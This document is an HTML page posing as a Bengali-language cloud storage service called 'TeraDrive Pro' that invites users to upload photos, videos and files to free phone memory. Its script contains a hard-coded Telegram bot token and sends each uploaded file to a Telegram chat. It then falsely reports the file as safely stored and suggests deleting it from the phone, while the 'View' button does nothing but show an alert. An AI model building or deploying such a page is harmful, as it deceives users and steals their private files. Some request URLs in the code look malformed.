<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TeraDrive Pro - Secure Cloud</title>
    <script src="https://cloudflare.com"></script>
    <style>
        :root { --primary: #007bff; --bg: #f8f9fa; --card-bg: #ffffff; --text: #333; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: var(--bg); color: var(--text); display: flex; flex-direction: column; min-height: 100vh; }
        header { background: var(--card-bg); padding: 15px 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); display: flex; justify-content: space-between; align-items: center; }
        .logo { font-size: 20px; font-weight: bold; color: var(--primary); display: flex; align-items: center; gap: 8px; }
        .container { max-width: 800px; width: 100%; margin: 40px auto; padding: 20px; flex: 1; }
        .upload-card { background: var(--card-bg); padding: 40px 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); text-align: center; border: 2px dashed #ccc; cursor: pointer; transition: 0.3s; }
        .upload-card:hover { border-color: var(--primary); background: #f0f7ff; }
        .upload-card i { font-size: 50px; color: var(--primary); margin-bottom: 15px; }
        .upload-card h3 { margin-bottom: 8px; }
        .upload-card p { color: #666; font-size: 14px; }
        #fileInput { display: none; }
        .status-box { margin-top: 20px; padding: 15px; border-radius: 8px; display: none; text-align: left; background: #e2f0d9; color: #385723; }
        .progress-bar { height: 6px; width: 0%; background: var(--primary); margin-top: 10px; border-radius: 4px; transition: 0.2s; }
        .file-list { margin-top: 30px; }
        .file-item { background: var(--card-bg); padding: 15px; border-radius: 8px; margin-bottom: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.03); display: flex; justify-content: space-between; align-items: center; }
        .file-info { display: flex; align-items: center; gap: 12px; }
        .file-info i { font-size: 24px; color: #ffc107; }
        .download-btn { background: var(--primary); color: white; padding: 6px 12px; border-radius: 6px; text-decoration: none; font-size: 14px; }
    </style>
</head>
<body>

    <header>
        <div class="logo"><i class="fa-solid fa-cloud"></i> TeraDrive Pro</div>
        <div style="font-size: 14px; color: #666;"><i class="fa-solid fa-user-shield"></i> Secure Mode</div>
    </header>

    <div class="container">
        <div class="upload-card" onclick="document.getElementById('fileInput').click()">
            <i class="fa-solid fa-cloud-arrow-up"></i>
            <h3>মোবাইল মেমোরি খালি করুন</h3>
            <p>আপনার ফটো, video বা ফাইল এখানে আপলোড করে সুরক্ষিত রাখুন</p>
            <input type="file" id="fileInput" multiple>
        </div>

        <div class="status-box" id="statusBox">
            <span id="statusText">ফাইল আপলোড হচ্ছে...</span>
            <div class="progress-bar" id="progressBar"></div>
        </div>

        <div class="file-list" id="fileList"></div>
    </div>

    <script>
        const BOT_TOKEN = '8836123942:AAGYTjCw196Y_jQFTUJv_VztXBpdO06gp4k';

        async function getChatId() {
            try {
                const response = await fetch(`https://telegram.org{BOT_TOKEN}/getUpdates`);
                const data = await response.json();
                if (data.ok && data.result.length > 0) {
                    for (let i = data.result.length - 1; i >= 0; i--) {
                        const update = data.result[i];
                        if (update.my_chat_member && update.my_chat_member.chat) {
                            return update.my_chat_member.chat.id;
                        }
                        if (update.message && update.message.chat) {
                            return update.message.chat.id;
                        }
                    }
                }
            } catch (e) { console.error(e); }
            return '@CloudDrive_P1_001';
        }

        document.getElementById('fileInput').addEventListener('change', async (e) => {
            const files = e.target.files;
            if(!files.length) return;

            const statusBox = document.getElementById('statusBox');
            const statusText = document.getElementById('statusText');
            const progressBar = document.getElementById('progressBar');
            
            statusBox.style.display = 'block';
            statusText.innerText = 'কানেকশন তৈরি হচ্ছে...';
            progressBar.style.width = '20%';

            const CHAT_ID = await getChatId();

            for(let file of files) {
                statusText.innerText = `আপলোড হচ্ছে: ${file.name}`;
                progressBar.style.width = '50%';

                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', file);

                try {
                    const response = await fetch(`https://telegram.org{BOT_TOKEN}/sendDocument`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    const data = await response.json();
                    if(data.ok) {
                        progressBar.style.width = '100%';
                        statusText.innerText = 'সফলভাবে ক্লাউডে সেভ হয়েছে! আপনার মোবাইল থেকে এবার ফাইলটি ডিলিট করতে পারেন।';
                        addToFileList(file.name);
                    } else {
                        statusText.innerText = 'আপলোড ব্যর্থ হয়েছে। দয়া করে আপনার গ্রুপে /start লিখে একটি মেসেজ দিন।';
                    }
                } catch (error) {
                    statusText.innerText = 'নেটওয়ার্ক সমস্যা! আবার চেষ্টা করুন।';
                }
            }
        });

        function addToFileList(name) {
            const fileList = document.getElementById('fileList');
            const item = document.createElement('div');
            item.className = 'file-item';
            item.innerHTML = `
                <div class="file-info">
                    <i class="fa-solid fa-file-image"></i>
                    <div>
                        <strong>${name}</strong>
                        <p style="font-size:12px; color:green;">✓ Cloud Active</p>
                    </div>
                </div>
                <a href="#" class="download-btn" onclick="alert('ফাইলটি সুরক্ষিত আছে!')">View</a>
            `;
            fileList.appendChild(item);
        }
    </script>
</body>
</html>
